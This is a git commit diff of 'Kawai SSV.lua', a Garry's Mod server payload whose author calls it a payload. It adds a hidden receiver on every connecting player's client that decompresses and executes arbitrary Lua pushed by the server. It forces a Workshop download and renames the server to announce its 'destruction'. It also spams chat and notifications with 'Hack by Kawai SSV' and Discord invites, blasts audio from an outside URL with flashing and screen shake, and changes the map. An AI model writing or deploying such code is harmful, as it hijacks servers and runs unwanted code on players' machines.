9758808888b74f348dc554642b88947f044948d1
Kurama <60360593+Kurama250@users.noreply.github.com>
2023-01-03 17:51:16 +0100

    Update Kawai SSV.lua

--- Kawai SSV.lua
+++ Kawai SSV.lua
@@ -1,6 +1,8 @@
 -- Payload Created by Kurama
 
--- Visuel Beta Kawai SSV
+-- Réglage des bugs by Doge Chien
+
+-- Visuel Kawai SSV
 
 -- Obligation to credit myself in the visual
 
@@ -14,26 +16,26 @@ end
     return ret
 end
 local randomtable = {
-    Mainnet = RandomString(0, 69),
-    Terosapasse = RandomString(0, 69),
-    EXROR_ = RandomString(0, 69),
-    FamosoKurama = RandomString(0, 69)
+    CodeRandom = RandomString(0, 69),
+    TimingRandom = RandomString(0, 69),
+    ClientRandom = RandomString(0, 69),
+    ServeurRadom = RandomString(0, 69)
     }
-util.AddNetworkString(randomtable["Terosapasse"])
-util.AddNetworkString(randomtable["Mainnet"])
-BroadcastLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme", function(ply)
+util.AddNetworkString(randomtable["TimingRandom"])
+util.AddNetworkString(randomtable["CodeRandom"])
+BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+hook.Add("PlayerInitialSpawn", "MacdoFritesKetchup", function(ply)
     if not ply:IsBot() then
-        ply:SendLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+        ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
         ply:SendLua([[steamworks.DownloadUGC(2017072873, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
     end
 end)
 
 m_strImageGlobalVar = RandomString( 6, 12 )
-local function FamosoKuramaClient(code)
+local function InfoClient(code)
 local data = util.Compress(code)
 local len = #data
-    net.Start(randomtable["Mainnet"])
+    net.Start(randomtable["CodeRandom"])
     net.WriteUInt(len, 16)
     net.WriteData(data, len)
     net.Broadcast()
@@ -44,35 +46,30 @@ for k, v in pairs(player.GetAll()) do
 end
 
 timer.Simple(2.5, function()
-    for k, v in pairs(player.GetAll()) do
-    v:SendLua([[RunConsoleCommand("gmod_language", "fr")]])
-end
-    RunConsoleCommand("hostname", "Serveur en cours de Destruction by Kawai SSV -) discord.gg/lesheitan")
+    RunConsoleCommand("hostname", "Serveur en cours de Destruction by Kawai SSV -) discord.gg/kurama")
     RunConsoleCommand("ulx", "god", "*")
     RunConsoleCommand("sv_alltalk", "1")
     PrecacheParticleSystem("lesheitan")
 end)
 
+-- Bordel - Spam Notif
 timer.Simple(5, function()
-FamosoKuramaClient([[net.Receive("]] .. randomtable["Terosapasse"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-FamosoKuramaClient([[
+InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+InfoClient([[
     for i = 1, 10 do
     ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
 timer.Simple(5, function()
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
-    notification.AddLegacy( "Teru Mikami", math.random(0, 4), 1.5 )
+    notification.AddLegacy( "Doge Chien", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
     notification.AddLegacy( "Kurama", math.random(0, 4), 1.5 )
 end)
-
 timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
         notification.AddLegacy( "TheCedoux", math.random(0, 4), 1.5 )
     end)
 end)
-
 timer.Simple(1, function()
     function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 0, 0, 255)
@@ -87,25 +84,34 @@ local col = Color( 0, 0, 255)
 end)
 ]])
 
-FamosoKuramaClient([[
-local sheitan = {}
-    hook.Add("HUDPaint", "]] .. RandomString(0, 69) .. [[",function()
-        for k,v in pairs(sheitan) do
-        v()
-    end
+timer.Simple( 5, function()
+InfoClient([=[
+g_]=].. m_strImageGlobalVar.. [=[ = {}
+local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
+local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
+local pnl = vgui.Create( "HTML" )
+    pnl:SetPos( ScrW() -1, ScrH() -1 )
+    pnl:SetVisible( true )
+    pnl:SetMouseInputEnabled( false )
+    pnl:SetKeyBoardInputEnabled( false )
+    pnl:SetSize( intSizeX, intSizeY )
+    pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
+local PageLoaded
+PageLoaded = function()
+local mat = pnl:GetHTMLMaterial()
+    if mat then
+g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
+    return
+end
+timer.Simple( 0.5, PageLoaded )
+end
+PageLoaded()
+end
+]=])
 end)
 
-sheitan["CoolEffect"] = function()
-local mats = Entity(0):GetMaterials()
-    for k,v in pairs(mats) do
-local wallahjerage = Color( 68, 68, 68)
-        Material(v):SetVector("$color", Vector(wallahjerage))
-        Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
-    end
-end
-]])
-
-FamosoKuramaClient([[
+-- Zoom - Sound - Color
+InfoClient([[
 local sW, sH = ScrW(), ScrH()
 local w,h = ScrW(), ScrH()
 local W, H = ScrW(), ScrH()
@@ -163,12 +169,11 @@ local particle = emitter:Add("particle/particle_smokegrenade", vPos)
     particle:SetColor(vv)
     particle:SetGravity(Vector(0,0,100))
     particle:SetAirResistance(500)
-local mats = Entity(0):GetMaterials()
-    for k,v in pairs(mats) do
-        Material(v):SetVector("$color", vv)
-    end
 end
-    hook.Add("Think","]] .. RandomString(0, 69) .. [[",function()
+local Wmats = Entity(0):GetMaterials()
+    for k,v in pairs(Wmats) do
+    Material(v):SetVector("$color", Vector(0,0,0))
+end 
 local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
 local v = Vector(col.r / 255, col.g / 255, col.b / 255)
     for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
@@ -178,8 +183,6 @@ end
     for k,p in pairs(player.GetAll()) do
     p:SetColor( col )
     end
-end)
-
 local chair = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
     chair:SetNoDraw(true)
 local data = {}
@@ -202,16 +205,67 @@ local z = LocalPlayer():GetPos().z
         end
     end
 end)
+local LeSheitanMusique = {}
+    hook.Add("HUDPaint", "MesOreilleSaleConnard",function()
+    for k,v in pairs(LeSheitanMusique) do
+        v()
+    end
+end)
+    
+SOUNDSTART_CTP = false
+OZJFOZJCEZIO = true
 
 sound.PlayURL("https://lesheitan.fr/songs/EverythingBlack_AMV.mp3", "noblock", function(s)
     if not IsValid(s) then return end
-        audio = s
-    s:SetVolume( 15 )
-    s:EnableLooping( false )
+    audio = s
+    s:EnableLooping( false)
+    if not s then return end
+    if SOUNDSTART_CTP then s:Stop() return end
+SOUNDSTART_CTP = true
+    s:SetVolume(15)
+    s:Play()
+local ragtbl = {}
+    LeSheitanMusique["CoolEffect"] = function()
+local tbl = {}
+    s:FFT(tbl,FFT_2048)
+    xpcall(function()
+local fal = 0
+    for i=4,6 do
+    fal = fal + tbl[i]
+end
+    if fal > 0.7 then
+local oneid = "newhud"..math.random(100, 300).."id"
+local Wmats = Entity(0):GetMaterials()
+    for k,v in pairs(Wmats) do
+    Material(v):SetVector("$color", Vector(255,255,255))
+end                         
+util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 ) 
+    for _, v in ipairs(player.GetAll()) do
+        v:SetWeaponColor(Vector(255, 255, 255))
+    end
+                
+                
+timer.Simple(0.2, function()
+local Wmats = Entity(0):GetMaterials()
+    for k,v in pairs(Wmats) do
+    Material(v):SetVector("$color", Vector(0,0,0))
+end                     
+    for _, v in ipairs(player.GetAll()) do
+        v:SetWeaponColor(Vector(0, 0, 0))
+    end   
+    end)
+end
+    end,function()
 end)
-
-hook.Add("HUDPaint", "]] .. randomtable["EXROR_"] .. [[", AudioVizualier)
-hook.Add("CalcView", "]] .. randomtable["EXROR_"] .. [[", function(ply, origin, angles, fov, znear, zfar)
+    end
+end)
+    surface.SetDrawColor( 255, 255, 255, 255)
+    surface.DrawTexturedRectRotated( (ScrW() /2), (ScrH() /2), 120, 120, math.sin( CurTime() *10) )
+    hook.Add( "RenderScreenspaceEffects", "KurmaBestHaxorLol", function()
+    DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 1 )
+end)
+hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
+hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
     return {
     ["origin"] = origin,
     ["angles"] = angles,
@@ -220,12 +274,11 @@ hook.Add("CalcView", "]] .. randomtable["EXROR_"] .. [[", function(ply, origin, 
     ["zfar"] = zfar
     }
 end)
-
 local function stop()
     audio = nil
-    hook.Remove("HUDPaint", "]] .. randomtable["EXROR_"] .. [[")
-    hook.Remove("HUDShouldDraw", "]] .. randomtable["EXROR_"] .. [[")
-    hook.Remove("CalcView", "]] .. randomtable["EXROR_"] .. [[") 
+    hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
+    hook.Remove("HUDShouldDraw", "]] .. randomtable["ClientRandom"] .. [[")
+    hook.Remove("CalcView", "]] .. randomtable["ClientRandom"] .. [[") 
     for k, v in pairs(oldhooks) do
     hook.Add("HUDPaint", k, v)
         oldhooks[k] = nil
@@ -246,9 +299,10 @@ timer.Simple(5, function()
     end
 end)
 
+-- Spam Chat
 timer.Simple(5, function()
-FamosoKuramaClient([[  
-timer.Create("]] .. randomtable["FamosoKurama"] .. [[", 1.5, 0, function()
+InfoClient([[  
+timer.Create("]] .. randomtable["ServeurRadom] .. [[", 1.5, 0, function()
 local time = tonumber(0)
 local Message = {
     "< Hack by Kawai SSV >",
@@ -267,7 +321,6 @@ local Message = {
     "<<<< Hack by Kawai SSV >>>>",
     "<<< Hack by Kawai SSV >>>",
     "<< Hack by Kawai SSV >>",
-    "< Hack by Kawai SSV >",
     }
     for _, line in pairs(Message) do
     time = time + tonumber(0.1)
@@ -279,16 +332,16 @@ end)
 ]])
 end)
 
+-- Model
 timer.Simple(5, function()
-FamosoKuramaClient([[
+InfoClient([[
 timer.Create("]] .. RandomString(0, 69) .. [[",1,5800,function()
-local sheitan = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
-    sheitan:SetNoDraw(true)
-    sheitan:SetModelScale(50)
+local Model12 = ClientsideModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
+    Model12:SetNoDraw(true)
+    Model12:SetModelScale(50)
 timer.Create("TuEsEnSueur", 0.01, 0, function()
-    sheitan:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
+    Model12:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
 end)
-
 local data = {}
 local function gensheitan(id)
 local pos = LocalPlayer():GetPos()
@@ -300,9 +353,9 @@ end
     hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
 local z = LocalPlayer():GetPos().z
     for i=1, #data do
-        sheitan:SetPos(data[i][1])
-        sheitan:SetupBones()
-        sheitan:DrawModel()
+        Model12:SetPos(data[i][1])
+        Model12:SetupBones()
+        Model12:DrawModel()
         data[i][1].z = data[i][1].z - data[i][2] / 20
         if data[i][1].z <= z then
         gensheitan(i)
@@ -313,48 +366,16 @@ end)
 ]])
 end)
 
-timer.Simple(5, function()
-timer.Create("MonServeurEstPasBien", 0.50, 25, function()
-    for k, v in pairs(player.GetAll()) do
-local trace = v:GetEyeTraceNoCursor()
-local car = ents.Create("prop_physics")
-local trace2 = util.TraceLine({
-    start = trace.HitPos,
-    endpos = trace.HitPos + Vector(0, 0, 5000000),
-    mask = MASK_SOLID_BRUSHONLY
-    })
-    car:SetModel("models/jazzmcfly/nekopara/coco/coco_player.mdl")
-    car:SetAngles(v:GetAngles())
-    car:SetPos(trace2.HitPos + Vector(0, 0, -60))
-    car:Spawn()
-    car:Activate()
-    car.boom = 6
-    car:GetPhysicsObject():SetVelocity(Vector(0, 0, -100))
-    car:Ignite(500)
-    car:AddCallback("PhysicsCollide", function(car, dat)
-local ef = EffectData()
-    ef:SetOrigin(car:GetPos())
-    ef:SetMagnitude(5)
-    ef:SetScale(200)
-    util.Effect("ThumperDust", ef)
-    car.boom = car.boom - 1
-    if car.boom < 0 then
-    car:Remove()
-end
-    end)
-end
-    end)
-end)
-
+-- Custom Settings
 timer.Simple( 5, function()
     RunConsoleCommand("sv_gravity", "200")
 end)
 
-timer.Create("OupsGM_Construct", 230, 1, function()
+timer.Create("LoadGM", 235, 1, function()
     RunConsoleCommand("ulx", "map", "gm_construct")
 end)
 
-timer.Create("SEIZED", 5, 0, function()
+timer.Create("Prop", 5, 0, function()
     for k, v in pairs(ents.FindByClass("prop_*")) do
 local phys = v:GetPhysicsObject()
     if (IsValid(phys)) then
@@ -369,7 +390,7 @@ local props = ents.GetAll()
     end
 end)
 
-timer.Create("FamosoKuramaSeizedLeTrucQuiTeSertDeServeur", 5, 99, function()
+timer.Create("RPName", 5, 99, function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
         v:setDarkRPVar("rpname", "Hack by Kawai SSV -) Join my Discord : discord.gg/kurama")
